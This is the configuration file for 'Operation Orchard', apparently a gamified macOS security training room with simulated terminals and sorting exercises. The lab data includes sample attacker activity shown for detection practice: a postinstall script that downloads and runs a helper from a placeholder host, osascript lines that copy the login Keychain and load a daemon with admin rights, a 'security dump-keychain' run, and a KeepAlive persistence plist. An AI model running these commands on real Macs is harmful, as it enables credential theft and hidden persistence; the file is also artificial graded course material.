import type { RoomExperience } from "./types";

// "Operation Orchard" for the "macos-security-fundamentals" room.
// Script: docs/campaign/22-macos-security-fundamentals.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Corva Studios (fictional), not the graded tasks' NexaCorp. Lab data differs
// from the graded tasks: the DMG/PKG console asks what a postinstall script
// fetches, not why packages are riskier (q1); the signing console checks
// third-party apps, never osascript's own signature (q2); the osascript sort
// leaves out hidden-answer password dialogs (q3, la2); the TCC sheet reads a
// user database, not la1's root sqlite3 write (la1, f1); the launchd console
// finds one daemon and asks what its plist says, not how agents and daemons
// compare (q4, q5) or Notion's updater (ac1); and nothing defines mechanisms
// (m1) or orders the triage (o1).
export const MACOS_SECURITY_FUNDAMENTALS: RoomExperience = {
  roomId: "macos-security-fundamentals",
  codename: "Operation Orchard",
  theme: "macos",
  handler: { name: "Mei Tran", role: "macOS Security Engineer, Corva Studios" },
  briefing: [
    "Corva Studios. 180 designers, 180 MacBooks, and an analyst team trained on Windows.",
    "macOS is Unix underneath, with its own gates: quarantine tags, Gatekeeper, signatures, privacy consent, and launchd.",
    "Mei Tran secures the fleet. She'll hand you a terminal and the same questions she asks of every odd Mac.",
    "Learn where software comes in, what vouches for it, and where it hides to stay.",
  ],
  mission: "Map Windows ideas onto macOS, open a DMG and unpack a PKG, read quarantine, Gatekeeper and code signatures from the terminal, judge osascript command lines, trace a Keychain dump in the unified log, read the TCC database, and inspect a launchd plist.",
  estimate: "~65 min",
  look: { primary: "#e2e8f0", secondary: "#60a5fa", warn: "#f43f5e" },
  scene: "orchard",
  layout: "stage",
  story: {
    intro: { title: "Unix With Its Own Gates", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/macos-security-fundamentals/orchard-intro-d8d49bf9.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/macos-security-fundamentals/orchard-intro-3ceca246.jpg" },
    afterStation: {
      doors: { title: "Who Vouches for It", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/macos-security-fundamentals/orchard-ch2-709e4bb4.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/macos-security-fundamentals/orchard-ch2-56c62e1b.jpg" },
      prompts: { title: "The Password Is the Key", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/macos-security-fundamentals/orchard-ch3-11f96c78.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/macos-security-fundamentals/orchard-ch3-af703548.jpg" },
      persist: { title: "KeepAlive", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/macos-security-fundamentals/orchard-finale-c8cc6fc7.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/macos-security-fundamentals/orchard-finale-4c721edd.jpg" },
    },
  },
  stations: [
    {
      id: "model",
      label: "Unix Underneath",
      topic: "macOS for an analyst trained on Windows or Linux",
      tagline: "Translate what you know into macOS terms",
      building: "archive",
      taskIds: ["macf-r1"],
    },
    {
      id: "doors",
      label: "Two Doors In",
      topic: "DMG disk images vs PKG installers and their scripts",
      tagline: "Mount one, unpack the other",
      building: "factory",
      taskIds: ["macf-r2", "macf-q1"],
    },
    {
      id: "gate",
      label: "Who Vouches for It",
      topic: "Quarantine attribute, Gatekeeper, notarization · Developer ID vs ad-hoc vs revoked",
      tagline: "Read the tags and signatures from the terminal",
      building: "vault",
      taskIds: ["macf-r3", "macf-r4", "macf-q2"],
    },
    {
      id: "prompts",
      label: "Scripts and Secrets",
      topic: "osascript as a living-off-the-land tool · the login Keychain",
      tagline: "Judge AppleScript one-liners, then trace a Keychain dump",
      building: "lab",
      taskIds: ["macf-r5", "macf-q3", "macf-la2", "macf-r6"],
    },
    {
      id: "tcc",
      label: "The Privacy Gate",
      topic: "TCC: who may record the screen, read every file, or control other apps",
      tagline: "Read the consent database row by row",
      building: "control",
      taskIds: ["macf-r7", "macf-la1", "macf-f1"],
    },
    {
      id: "persist",
      label: "Staying Power",
      topic: "LaunchAgents vs LaunchDaemons · launchctl and plists",
      tagline: "Find what starts on its own, and read its plist",
      building: "ticket",
      taskIds: ["macf-r8", "macf-q4", "macf-ac1", "macf-q5", "macf-m1", "macf-o1"],
      boss: true,
    },
  ],
  personas: {
    "macf-q1": { name: "Mei Tran", role: "macOS Security Engineer", line: "Same app, shipped as a DMG or as a PKG. Why is one riskier per click?" },
    "macf-q2": { name: "Mei Tran", role: "macOS Security Engineer", line: "osascript, signed by Apple. A junior calls it benign. Correct them." },
    "macf-q3": { name: "Mei Tran", role: "macOS Security Engineer", line: "An ad-hoc app spawns osascript with 'display dialog'. Read that one event." },
    "macf-q4": { name: "Mei Tran", role: "macOS Security Engineer", line: "A LaunchAgent on one Mac, a LaunchDaemon on another. Which is worse?" },
    "macf-q5": { name: "Mei Tran", role: "macOS Security Engineer", line: "The app is closed, but something keeps running. Where do you look first?" },
    "macf-ac1": { name: "Mei Tran", role: "macOS Security Engineer", line: "A .pkg install and a new LaunchAgent on a designer's Mac. Verdict?" },
  },
  briefings: {
    // ── Reading 1: the mental model ──
    "macf-r1": [
      {
        kind: "match",
        title: "Translate to macOS",
        prompt: "You know these on Windows. Match each to its macOS counterpart.",
        pairs: [
          { id: "reg", left: "The Registry", right: "Property list (.plist) files", why: "Settings live in plist files (XML or binary), not in one central database." },
          { id: "run", left: "A Run key or scheduled task", right: "A LaunchAgent or LaunchDaemon", why: "launchd starts whatever a plist in those folders tells it to." },
          { id: "scm", left: "services.exe / Service Control Manager", right: "launchd (PID 1)", why: "One supervisor starts and keeps alive almost everything." },
          { id: "motw", left: "Mark-of-the-Web", right: "The com.apple.quarantine attribute", why: "Same purpose (tag downloads), different mechanism (an extended attribute)." },
          { id: "users", left: "C:\\Users\\name", right: "/Users/name", why: "Unix layout: home folders under /Users." },
          { id: "uac", left: "A UAC elevation prompt", right: "An administrator password prompt (sudo / authorization dialog)", why: "Elevation asks for an admin's password, which is exactly why fake password dialogs work." },
        ],
      },
    ],
    // ── Reading 2: DMG and PKG ──
    "macf-r2": [
      {
        kind: "terminal",
        title: "Mount One, Unpack the Other",
        prompt: "Two downloads on a designer's Mac: FontPack.dmg and ColorSync-Pro.pkg. Look inside both without installing anything.",
        shell: "bash",
        host: "mei@corva-mbp ~/Downloads %",
        commands: [
          { match: "hdiutil\\s+attach\\s+fontpack\\.dmg", help: "hdiutil attach FontPack.dmg                         mount the disk image",
            output: "/dev/disk4          \tGUID_partition_scheme\t\n/dev/disk4s1        \tApple_APFS\t\n/dev/disk5          \tEF57347C-0000-11AA-AA11-0030654\t\n/dev/disk5s1        \t41504653-0000-11AA-AA11-0030654\t/Volumes/FontPack" },
          { match: "ls\\s+(-l\\s+)?/volumes/fontpack/?", help: "ls /Volumes/FontPack                                what's on the mounted volume",
            output: "Applications\tFontPack.app" },
          { match: "pkgutil\\s+--expand\\s+colorsync-pro\\.pkg\\s+\\S+", help: "pkgutil --expand ColorSync-Pro.pkg /tmp/csp           unpack the installer without running it",
            output: "" },
          { match: "ls\\s+(-r\\s+|-R\\s+)?/tmp/csp/?.*", help: "ls /tmp/csp/Scripts                                    what scripts ship inside",
            output: "postinstall\tpreinstall" },
          { match: "cat\\s+/tmp/csp/scripts/postinstall", help: "cat /tmp/csp/Scripts/postinstall                       read what runs after install",
            output: "#!/bin/zsh\n# ColorSync Pro post-install\nmkdir -p /Library/Application\\ Support/ColorSyncPro\ncurl -fsSL https://cs-pro-update.example/helper -o /Library/Application\\ Support/ColorSyncPro/helper\nchmod +x /Library/Application\\ Support/ColorSyncPro/helper\n/Library/Application\\ Support/ColorSyncPro/helper --register\nexit 0" },
        ],
        objectives: [
          { id: "mount", task: "Where did the DMG mount?", hint: "hdiutil attach FontPack.dmg", answer: ["/Volumes/FontPack"], why: "A DMG just exposes files on a new volume. Nothing ran yet." },
          { id: "scripts", task: "Which script runs after the PKG installs?", hint: "pkgutil --expand ColorSync-Pro.pkg /tmp/csp, then ls /tmp/csp/Scripts", answer: ["postinstall"], why: "PKGs can carry preinstall and postinstall scripts that run as part of the install." },
          { id: "fetch", task: "From which domain does that script download a helper?", hint: "cat /tmp/csp/Scripts/postinstall", answer: ["cs-pro-update.example"], why: "The installer fetches and runs a second binary you never saw. Expanding a PKG before installing is how you find that out." },
        ],
      },
    ],
    // ── Readings 3-4: quarantine, Gatekeeper, signatures ──
    "macf-r4": [
      {
        kind: "terminal",
        title: "Who Vouches for It?",
        prompt: "Three apps on a designer's Mac. Read each one's quarantine tag, Gatekeeper verdict and code signature.",
        shell: "bash",
        host: "mei@corva-mbp ~ %",
        commands: [
          { match: "xattr\\s+-l\\s+.*sketchboard\\.app.*", help: "xattr -l /Applications/Sketchboard.app            extended attributes, including quarantine",
            output: "com.apple.quarantine: 0083;6727f1a2;Safari;8C1F6E0A-3D2B-4E8B-9A1C-5F7D2E9B4A11" },
          { match: "spctl\\s+(-a|--assess)\\s+.*sketchboard\\.app.*", help: "spctl -a -vvv /Applications/Sketchboard.app        Gatekeeper's verdict",
            output: "/Applications/Sketchboard.app: accepted\nsource=Notarized Developer ID\norigin=Developer ID Application: Sketchboard Labs Ltd (7QX2M4ABCD)" },
          { match: "spctl\\s+(-a|--assess)\\s+.*pixelmagic\\.app.*", help: "spctl -a -vvv /Applications/PixelMagic.app",
            output: "/Applications/PixelMagic.app: rejected\nsource=Unnotarized Developer ID\norigin=Developer ID Application: Wu Han Soft (K93LPQ1XYZ)" },
          { match: "codesign\\s+-dvv?v?\\s+.*fontfixer.*", help: "codesign -dvv ~/Downloads/FontFixer                 who signed this binary",
            output: "Executable=/Users/mei/Downloads/FontFixer\nIdentifier=fontfixer-55554944a1b2c3\nFormat=Mach-O thin (arm64)\nCodeDirectory v=20400 size=1288 flags=0x20002(adhoc,linker-signed) hashes=29+0 location=embedded\nSignature=adhoc\nTeamIdentifier=not set" },
          { match: "codesign\\s+-dvv?v?\\s+.*sketchboard\\.app.*", help: "codesign -dvv /Applications/Sketchboard.app",
            output: "Executable=/Applications/Sketchboard.app/Contents/MacOS/Sketchboard\nIdentifier=com.sketchboard.app\nAuthority=Developer ID Application: Sketchboard Labs Ltd (7QX2M4ABCD)\nAuthority=Developer ID Certification Authority\nAuthority=Apple Root CA\nTeamIdentifier=7QX2M4ABCD" },
        ],
        objectives: [
          { id: "agent", task: "Which app downloaded Sketchboard? (from the quarantine tag)", hint: "xattr -l /Applications/Sketchboard.app", answer: ["Safari"], why: "The quarantine value records flags, a timestamp, the downloading app and an event ID. It marks origin, not guilt." },
          { id: "rej", task: "Which app does Gatekeeper reject?", hint: "spctl -a -vvv on each app", answer: ["PixelMagic", "PixelMagic.app"], why: "Signed with a Developer ID but never notarized by Apple: Gatekeeper refuses it on first launch." },
          { id: "adhoc", task: "What kind of signature does FontFixer carry?", hint: "codesign -dvv ~/Downloads/FontFixer", answer: ["adhoc", "ad-hoc", "ad hoc"], why: "Signature=adhoc and no TeamIdentifier: it satisfies the 'must be signed' rule while naming nobody." },
        ],
      },
    ],
    // ── Reading 5: osascript ──
    "macf-r5": [
      {
        kind: "sort",
        title: "Admin Tool or Abuse?",
        prompt: "osascript command lines seen across the fleet this week, each with its parent process. Sort them.",
        buckets: [
          { id: "ok", label: "Expected automation" },
          { id: "bad", label: "Investigate" },
        ],
        items: [
          { id: "a", text: "Jamf agent > osascript -e 'display notification \"Restart tonight for updates\" with title \"Corva IT\"'", bucket: "ok", why: "The MDM agent posting a notification: exactly what osascript is for." },
          { id: "b", text: "FontFixer (ad-hoc) > osascript -e 'tell application \"Finder\" to duplicate (POSIX file \"/Users/mei/Library/Keychains/login.keychain-db\") to (POSIX file \"/tmp\")'", bucket: "bad", why: "An unknown, unsigned-identity binary copying the login Keychain file out of its folder." },
          { id: "c", text: "Adobe installer > osascript -e 'tell application \"Adobe Photoshop 2026\" to quit'", bucket: "ok", why: "An installer closing the app it's about to update." },
          { id: "d", text: "curl | sh > osascript -e 'do shell script \"launchctl load /Library/LaunchDaemons/com.sysupdate.helper.plist\" with administrator privileges'", bucket: "bad", why: "A piped download script asking for admin rights to load a daemon." },
          { id: "e", text: "Terminal (user mei, IT staff) > osascript -e 'tell application \"System Events\" to get name of every login item'", bucket: "ok", why: "An admin listing login items while troubleshooting: same tool, legitimate intent, known user." },
        ],
      },
    ],
    // ── Reading 6: the Keychain ──
    "macf-r6": [
      {
        kind: "terminal",
        title: "Trace the Keychain Dump",
        prompt: "EDR flagged the security tool on CORVA-MBP-112. Ask the unified log what ran it, and how.",
        shell: "bash",
        host: "mei@corva-mbp ~ %",
        commands: [
          { match: "log\\s+show\\s+.*process\\s*==\\s*['\"]?security['\"]?.*", help: "log show --last 2h --predicate 'process == \"security\"' --style compact     every run of the security tool",
            output: "2026-11-04 10:14:02.118 Df security[8812:4a2c1] [com.apple.securityd] dump-keychain -d /Users/a.reyes/Library/Keychains/login.keychain-db\n2026-11-04 10:14:02.340 Df security[8812:4a2c1] [com.apple.securityd] SecKeychainItemCopyContent: 214 items" },
          { match: "ps\\s+-o\\s+.*-p\\s+8812.*", help: "ps -o pid,ppid,command -p 8812          the security process and its parent PID",
            output: "  PID  PPID COMMAND\n 8812  8790 /usr/bin/security dump-keychain -d /Users/a.reyes/Library/Keychains/login.keychain-db" },
          { match: "ps\\s+-o\\s+.*-p\\s+8790.*", help: "ps -o pid,ppid,command -p 8790          who started it",
            output: "  PID  PPID COMMAND\n 8790  8771 /Users/a.reyes/Library/Application Support/.renderd/renderd" },
        ],
        objectives: [
          { id: "cmd", task: "Which security subcommand ran?", hint: "log show --last 2h --predicate 'process == \"security\"' --style compact", answer: ["dump-keychain", "dump-keychain -d"], why: "dump-keychain -d decrypts and prints every item. 214 items left in cleartext." },
          { id: "parent", task: "What is the parent process's file name?", hint: "ps -o pid,ppid,command -p 8812, then the parent PID", answer: ["renderd"], why: "A hidden folder under Application Support, a name chosen to look like a system daemon. Not a tool anyone at Corva uses." },
          { id: "why", task: "Why could it decrypt the Keychain without a prompt? Which password unlocks the login Keychain by default?", hint: "Reading 6: the same password as...", answer: ["login", "the login password", "the user's login password", "user password"], why: "The login Keychain opens with the user's login password, so a phished login password unlocks everything stored in it." },
        ],
      },
    ],
    // ── Reading 7: TCC ──
    "macf-r7": [
      {
        kind: "worksheet",
        title: "Read the Consent Database",
        prompt: "Rows from a designer's Mac, from both TCC databases: the per-user one (camera, microphone, automation) and the system one (Accessibility, Full Disk Access). auth_value 2 means allowed, 0 means denied.",
        caption: "select service, client, auth_value, auth_reason from access · user TCC.db (~/Library/...) and system TCC.db (/Library/...)",
        columns: ["database", "service", "client", "auth_value", "auth_reason"],
        rows: [
          ["user", "kTCCServiceMicrophone", "com.microsoft.teams2", "2", "2 (user consent)"],
          ["user", "kTCCServiceCamera", "us.zoom.xos", "2", "2 (user consent)"],
          ["system", "kTCCServiceAccessibility", "com.renderd.agent", "2", "4 (system set)"],
          ["user", "kTCCServiceAppleEvents", "com.apple.Terminal", "0", "2 (user consent)"],
        ],
        questions: [
          { id: "acc", q: "Which client may control other apps through Accessibility?", hint: "kTCCServiceAccessibility.", answer: ["com.renderd.agent", "renderd"], why: "Accessibility lets an app click, type and read other windows: a keylogger's dream." },
          { id: "how", q: "Did a user approve that grant? (yes/no)", hint: "Read its auth_reason.", answer: ["no"], why: "Reason 4 is a system-set entry, not a click in a consent prompt. Grants nobody clicked are what TCC tampering leaves behind." },
          { id: "deny", q: "Which entry was denied?", hint: "auth_value 0.", answer: ["kTCCServiceAppleEvents", "AppleEvents", "com.apple.Terminal", "Terminal"], why: "The user said no to Terminal automating another app. Denials are recorded too." },
        ],
      },
    ],
    // ── Reading 8: launchd persistence ──
    "macf-r8": [
      {
        kind: "terminal",
        title: "What Starts on Its Own?",
        prompt: "Check the three launchd folders on CORVA-MBP-112 and read anything you don't recognise.",
        shell: "bash",
        host: "mei@corva-mbp ~ %",
        commands: [
          { match: "ls\\s+(-l\\s+)?~/library/launchagents/?", help: "ls ~/Library/LaunchAgents                          this user's agents",
            output: "com.google.keystone.agent.plist\tcom.adobe.ccxprocess.plist" },
          { match: "ls\\s+(-l\\s+)?/library/launchagents/?", help: "ls /Library/LaunchAgents                           agents for every user",
            output: "com.microsoft.update.agent.plist" },
          { match: "ls\\s+(-l\\s+)?/library/launchdaemons/?", help: "ls /Library/LaunchDaemons                          system daemons",
            output: "com.microsoft.autoupdate.helper.plist\tcom.jamf.management.daemon.plist\tcom.sysupdate.helper.plist" },
          { match: "plutil\\s+-p\\s+/library/launchdaemons/com\\.sysupdate\\.helper\\.plist", help: "plutil -p /Library/LaunchDaemons/com.sysupdate.helper.plist     print a plist",
            output: "{\n  \"KeepAlive\" => 1\n  \"Label\" => \"com.sysupdate.helper\"\n  \"ProgramArguments\" => [\n    0 => \"/Users/Shared/.sysupd/helper\"\n    1 => \"--daemon\"\n  ]\n  \"RunAtLoad\" => 1\n}" },
        ],
        objectives: [
          { id: "odd", task: "Which daemon plist doesn't belong to known software?", hint: "ls /Library/LaunchDaemons", answer: ["com.sysupdate.helper.plist", "com.sysupdate.helper"], why: "Microsoft and Jamf are fleet software. 'sysupdate' is a generic name that matches no vendor." },
          { id: "bin", task: "Which binary does it run?", hint: "plutil -p /Library/LaunchDaemons/com.sysupdate.helper.plist", answer: ["/Users/Shared/.sysupd/helper"], why: "A hidden folder in /Users/Shared, writable by everyone: no real vendor installs a system daemon there." },
          { id: "keep", task: "If you kill the process, what brings it straight back? (the plist key)", hint: "Look for a key set to 1.", answer: ["KeepAlive"], why: "KeepAlive tells launchd to restart it whenever it dies. Unload the plist (launchctl bootout), then remove it and the binary." },
        ],
      },
    ],
  },
};
